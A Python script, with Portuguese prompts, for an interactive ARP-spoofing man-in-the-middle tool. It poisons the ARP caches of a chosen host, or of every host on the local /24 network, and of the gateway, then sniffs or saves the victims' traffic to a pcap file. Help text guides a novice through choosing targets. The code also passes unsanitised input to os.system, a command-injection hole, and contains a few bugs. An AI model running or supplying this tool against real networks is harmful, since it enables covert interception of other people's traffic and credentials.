# -*- coding: utf-8 -*-
from scapy.all import *
import os
import sys
import threading
import signal

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):     
    print ('[*] Restaurando alvo...')
    send(ARP(op = 2, psrc = gateway_ip, pdst = target_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateway_mac), count = 5)     
    send(ARP(op = 2, psrc = target_ip, pdst = gateway_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = target_mac), count = 5)      

    print('[*] Terminando o processo')
    os.kill(os.getpid(), signal.SIGINT)    

def get_mac(ip_address):       
    responses, unanswered = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = ip_address), timeout = 2, retry = 10)     
    for s, r in responses:
        return r[Ether].src     
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()       
    poison_target.op = 2        
    poison_target.psrc = gateway_ip     
    poison_target.pdst = target_ip      
    poison_target.hwdst = target_mac    

    poison_gateway = ARP()      
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip    
    poison_gateway.pdst = gateway_ip       
    poison_gateway.hwdst = gateway_mac    

    print ('[*] Iniciando o ARP Spoofing. [CTRL-C para parar]')
    while True:
        try:
            send(poison_target)    
            send(poison_gateway)    
            time.sleep(2)
        
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print ('[*] ARP Spoofing finalizado.')
        return

def netzpoofer():
    os.system("clear")
    print(' _     _         _                                 ____             ')
    print('(_)   (_)  ____ (_)_  _____                       (____) ____  _    ')
    print('(__)_ (_) (____)(___)(_____) ____    ___    ___  (_)__  (____)(_)__ ')
    print('(_)(_)(_)(_)_(_)(_)    _(_) (____)  (___)  (___) (____)(_)_(_)(____)')
    print('(_)  (__)(__)__ (_)_  (_)__ (_)_(_)(_)_(_)(_)_(_)(_)   (__)__ (_)   ')
    print('(_)   (_) (____) (__)(_____)(____)  (___)  (___) (_)    (____)(_)   ')
    print('                            (_)                                     ')
    print('                            (_)                                     ')

    print('')
    print('[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]')
    print('[*]                                                                  [*]')
    print('[*] Selecione o seu adaptador de rede                                [*]')
    print('[*] Selecione o IP do alvo                                           [*]')
    print('[*] Selecione o gateway da sua rede                                  [*]')
    print('[*] Escolha entre salvar ou não o tráfego interceptado               [*]')
    print('[*] Digite [?] para ajuda                                            [*]')
    print('[*]                                                                  [*]')
    print('[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]')
    print('')

    print('[*] Todas os adaptadores de rede: ')
    os.system('ip -br link | awk ' + "'{print $1}'")
    print('-------------------------------------------------------------------')
    interface = input('[?] Adaptador de Rede: ')
    if(interface == '?'):
        print('[*] O adaptador de rede é o hardware usado para te conectar com a rede')
        print('[*] Se a sua conexão é cabeada, então a sua interface provavelmente é eth0')
        print('[*] Se a sua conexão é sem fio, então a sua interface provavelmente é wlan0')
        interface = input('Adaptador de Rede: ')

    print('[*] Seu IP ')
    os.system("ip -br address | grep " + interface)
    print('-------------------------------------------------------------------')
    net = input('[?] Endereço de rede: ')
    if(net == '?'):
        print('[*] O endereço de rede define qual rede você está conectado')
        print('[*] Se o seu IP é 192.168.0.101 e a sua máscara de rede é 255.255.255.0 ')
        print('[*] Então o seu endereço de rede é 192.168.0.0')
        net = input('Endereço de rede: ')

    print('[*] Deseja interceptar todos os IPs da rede?')
    gate = input('[Y/N]')
    if(gate == 'Y'):
        target_ip = '*'
        all_target = []
        nmap_pop = os.popen("nmap -sn " + net + '/24'" | grep for | cut -f 5 -d ' '").read()  
        all_target = nmap_pop.split('\n')
        all_target.pop(0)
        all_target.pop(-1)
        all_target.pop(-1)
    else:
        print('[*] Todos os alvos possíveis na rede: ')
        os.system("nmap -sn " + net + '/24'" | grep for | cut -f 5 -d ' '")
        print('-------------------------------------------------------------------')
        target_ip = input('[?]IP do alvo: ')
        if(target_ip == '?'):
            print('[*] Aqui é onde você seleciona o endereço de IP do seu alvo')
            print('[*] O IP do alvo provavelmente está na lista acima')
            print('[*] O IP do alvo deve estar conectado a sua rede')
            target_ip = input('IP do alvo: ')
        
    print('[*] Possíveis gateways na sua rede: ')
    os.system("route -n")
    print('-------------------------------------------------------------------')
    gateway_ip = input('[?] IP do gateway: ')
    if(gateway_ip == '?'):
        print('[*] O gateway é o portão entre a sua intranet e a internet')
        print('[*] Em uma rede doméstica simples, o gateway é o roteador')
        print('[*] Se o seu IP é 192.168.0.101 então o seu gateway provavelmente é 192.168.0.1')
        gateway_ip = input('IP do gateway: ')
    print('[*] Salvar o tráfego interceptado em um arquivo .pcap?')
    gate = input('[Y/N] ')
    if(gate == 'Y'):
        packet_count = int(input('Número de pacotes a serer interceptados: '))    
        output_filename = input('Nome do arquivo de saída: ')
        if(target_ip == '*'):
            for ip in all_target:
                spoof_func(interface, gateway_ip, ip)
            multi_limit_sniff(interface, gateway_ip, all_target, packet_count, output_filename)
        else:
            spoof_func(interface, gateway_ip, target_ip)
            limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename)
    else:
        os.system("clear")
        if(target_ip == '*'):
            for ip in all_target:
                spoof_func(interface, gateway_ip, ip)
            multi_constant_sniff(interface, gateway_ip, all_target)
        else:
            spoof_func(interface, gateway_ip, target_ip)
            constant_sniff(interface, gateway_ip, target_ip)

def spoof_func(interface, gateway_ip, target_ip):
    conf.iface = interface    
    conf.verb = 0
    print ('[*] Configurando %s' %interface)
    gateway_mac = get_mac(gateway_ip)       

    if gateway_mac is None:    
        print ('[!!!] Erro em adquirir o MAC do gateway. Encerrando.')
        sys.exit(0)
    else:
        print ('[*] Gateway %s está em %s') % (gateway_ip, gateway_mac)      

    target_mac = get_mac(target_ip)   

    if target_mac is None:     
        print ('[!!!] Erro em adquirir o MAC do gateway. Encerrando.')
        sys.exit(0)
    else:
        print ('[*] O alvo %s está em %s' % (target_ip, target_mac))      

    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))      
    poison_thread.start()
    return gateway_mac, target_mac

def pre_restore(gateway_ip, target_ip):
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    print('[*] Restaurando alvos')
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

def multi_restore(gateway_ip, all_target):
    gateway_mac = get_mac(gateway_ip)
    for ip in all_target:
        target_mac = get_mac(ip)
        print('[*] Restaurando alvo %s' %ip)
        send(ARP(op = 2, psrc = gateway_ip, pdst = ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateway_mac), count = 5)     
        send(ARP(op = 2, psrc = ip, pdst = gateway_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = target_mac), count = 5)      
    print('[*] Terminando o processo')
    os.kill(os.getpid(), signal.SIGINT) 

def limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename):  
    try:      
        print ('[*] Iniciando o sniffer para %d pacotes' % packet_count)
        bpf_filter = 'ip host %s' %target_ip
        packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)
        wrpcap(output_filename, packets)
        os.system("mv " + output_filename + " ./Files") 
        pre_restore(gateway_ip, target_ip)     

    except KeyboardInterrupt:      
        pre_restore(gateway_ip, target_ip)          
        sys.exit(0)

def constant_sniff(interface, gateway_ip, target_ip): 
    try:      
        print ('[*] Iniciando o sniffer de pacotes')
        bpf_filter = 'ip host %s' %target_ip
        while True:
            packets = sniff(count = 1, filter = bpf_filter, iface = interface)
            packets.show() 
    except KeyboardInterrupt:      
        pre_restore(gateway_ip, target_ip) 
        sys.exit(0)

def multi_limit_sniff(interface, gateway_ip, all_target, packet_count, output_filename):  
    try:      
        print ('[*] Iniciando o sniffer para %d pacotes' % packet_count)
        packets = sniff(count = packet_count, iface = interface)
        wrpcap(output_filename, packets)
        os.system("mv " + output_filename + " ./Files")  
        multi_restore(gateway_ip, all_target)

    except KeyboardInterrupt: 
        multi_restore(gateway_ip, all_target)              
        sys.exit(0)

def multi_constant_sniff(interface, gateway_ip, all_target): 
    try:      
        print ('[*] Iniciando o sniffer de pacotes')
        while True:
            packets = sniff(count = 1, iface = interface)
            packets.show() 
    except KeyboardInterrupt:      
        multi_restore(gateway_ip, all_target) 
        sys.exit(0)